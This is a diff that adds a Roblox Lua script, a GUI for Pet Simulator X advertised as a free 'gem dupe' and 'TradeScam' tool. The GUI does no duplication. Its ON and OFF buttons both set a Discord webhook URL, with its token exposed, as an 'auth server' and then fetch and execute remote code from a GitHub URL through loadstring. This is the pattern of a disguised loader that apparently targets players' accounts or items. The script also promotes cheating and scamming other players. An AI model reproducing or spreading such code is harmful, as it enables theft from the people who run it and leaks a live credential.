@@ -1,0 +1,185 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local mainframe = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local mainframe2 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local gemdupe = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local tradescam = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local gemdupeon = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local gemdupeoff = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local ts = Instance.new("TextLabel")
+local gp = Instance.new("TextLabel")
+local gp2 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+mainframe.Name = "mainframe"
+mainframe.Parent = ScreenGui
+mainframe.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
+mainframe.Position = UDim2.new(0.45119065, 0, 0.610972583, 0)
+mainframe.Size = UDim2.new(0, 409, 0, 224)
+mainframe.Active = true
+mainframe.Draggable = true 
+mainframe.Selectable = true 
+
+UICorner.Parent = mainframe
+
+mainframe2.Name = "mainframe2"
+mainframe2.Parent = mainframe
+mainframe2.BackgroundColor3 = Color3.fromRGB(107, 107, 107)
+mainframe2.Position = UDim2.new(0.0282077938, 0, 0.044008255, 0)
+mainframe2.Size = UDim2.new(0, 388, 0, 203)
+
+UICorner_2.Parent = mainframe2
+
+TextLabel.Parent = mainframe2
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.237113401, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "PSX DUPE FREE - v3.1"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 40.000
+
+gemdupe.Name = "gemdupe"
+gemdupe.Parent = mainframe2
+gemdupe.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
+gemdupe.Position = UDim2.new(0.0257731955, 0, 0.295566499, 0)
+gemdupe.Size = UDim2.new(0, 82, 0, 29)
+gemdupe.Font = Enum.Font.FredokaOne
+gemdupe.Text = "Gem Dupe"
+gemdupe.TextColor3 = Color3.fromRGB(0, 0, 0)
+gemdupe.TextSize = 17.000
+
+UICorner_3.Parent = gemdupe
+
+tradescam.Name = "tradescam"
+tradescam.Parent = mainframe2
+tradescam.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
+tradescam.Position = UDim2.new(0.0257731955, 0, 0.571428597, 0)
+tradescam.Size = UDim2.new(0, 82, 0, 30)
+tradescam.Font = Enum.Font.FredokaOne
+tradescam.Text = "TradeScam"
+tradescam.TextColor3 = Color3.fromRGB(0, 0, 0)
+tradescam.TextSize = 17.000
+
+UICorner_4.Parent = tradescam
+
+gemdupeon.Name = "gemdupeon"
+gemdupeon.Parent = mainframe
+gemdupeon.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
+gemdupeon.Position = UDim2.new(0.35095647, 0, 0.420566559, 0)
+gemdupeon.Size = UDim2.new(0, 79, 0, 42)
+gemdupeon.Font = Enum.Font.FredokaOne
+gemdupeon.Text = "ON"
+gemdupeon.TextColor3 = Color3.fromRGB(0, 0, 0)
+gemdupeon.TextSize = 35.000
+
+UICorner_5.Parent = gemdupeon
+
+gemdupeoff.Name = "gemdupeoff"
+gemdupeoff.Parent = mainframe
+gemdupeoff.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
+gemdupeoff.Position = UDim2.new(0.656579971, 0, 0.41610226, 0)
+gemdupeoff.Size = UDim2.new(0, 79, 0, 42)
+gemdupeoff.Font = Enum.Font.FredokaOne
+gemdupeoff.Text = "OFF"
+gemdupeoff.TextColor3 = Color3.fromRGB(0, 0, 0)
+gemdupeoff.TextSize = 35.000
+
+UICorner_6.Parent = gemdupeoff
+
+ts.Name = "ts"
+ts.Parent = mainframe
+ts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ts.BackgroundTransparency = 1.000
+ts.Position = UDim2.new(0.281123191, 0, 0.732142806, 0)
+ts.Size = UDim2.new(0, 178, 0, 33)
+ts.Visible = false
+ts.Font = Enum.Font.FredokaOne
+ts.Text = "Tradescam - This is a free version of the tradescam script so it wont work as expected. "
+ts.TextColor3 = Color3.fromRGB(0, 0, 0)
+ts.TextSize = 10.000
+
+gp.Name = "gp"
+gp.Parent = mainframe
+gp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+gp.BackgroundTransparency = 1.000
+gp.Position = UDim2.new(0.281123191, 0, 0.732142806, 0)
+gp.Size = UDim2.new(0, 178, 0, 33)
+gp.Font = Enum.Font.FredokaOne
+gp.Text = "Gem Dupe - This is a free version and there is a small chance of getting banned and a chance"
+gp.TextColor3 = Color3.fromRGB(0, 0, 0)
+gp.TextSize = 10.000
+
+gp2.Name = "gp2"
+gp2.Parent = mainframe
+gp2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+gp2.BackgroundTransparency = 1.000
+gp2.Position = UDim2.new(0.276233226, 0, 0.799107075, 0)
+gp2.Size = UDim2.new(0, 178, 0, 33)
+gp2.Font = Enum.Font.FredokaOne
+gp2.Text = "so i recommend doing it on your alt account. LEVEL 2 BANK ACCOUNT NEEDED"
+gp2.TextColor3 = Color3.fromRGB(0, 0, 0)
+gp2.TextSize = 10.000
+
+-- Scripts:
+
+local function BLOWA_fake_script() -- gemdupe.LocalScript 
+	local script = Instance.new('LocalScript', gemdupe)
+
+	script.Parent.MouseButton1Click:connect(function()
+		script.Parent.Parent.Parent.ts.Visible = false 
+		script.Parent.Parent.Parent.gp.Visible = true 
+		script.Parent.Parent.Parent.gp2.Visible = true 
+		wait(0.1)
+	end)
+	
+end
+coroutine.wrap(BLOWA_fake_script)()
+local function EOBWJW_fake_script() -- tradescam.LocalScript 
+	local script = Instance.new('LocalScript', tradescam)
+
+	script.Parent.MouseButton1Click:connect(function()
+		script.Parent.Parent.Parent.ts.Visible = true 
+		script.Parent.Parent.Parent.gp.Visible = false 
+		script.Parent.Parent.Parent.gp2.Visible = false 
+		wait(0.1)
+	end)
+	
+end
+coroutine.wrap(EOBWJW_fake_script)()
+local function VGTKP_fake_script() -- gemdupeon.LocalScript 
+	local script = Instance.new('LocalScript', gemdupeon)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		_G.Key = "21oikkrA"
+		_G.AuthServer = "https://discord.com/api/webhooks/1051840785546498088/ISpYg9xUZ4LLlhjFtjdRcTswaA9oxT7ZdMgu2i_OACAL3xS016r8HJ9n3_NEcVBff79W"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+	end)
+end
+coroutine.wrap(VGTKP_fake_script)()
+local function DUBKKTE_fake_script() -- gemdupeoff.LocalScript 
+	local script = Instance.new('LocalScript', gemdupeoff)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		_G.Key = "21oikkrA"
+		_G.AuthServer = "https://discord.com/api/webhooks/1051840785546498088/ISpYg9xUZ4LLlhjFtjdRcTswaA9oxT7ZdMgu2i_OACAL3xS016r8HJ9n3_NEcVBff79W"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+	end)
+end
+coroutine.wrap(DUBKKTE_fake_script)()
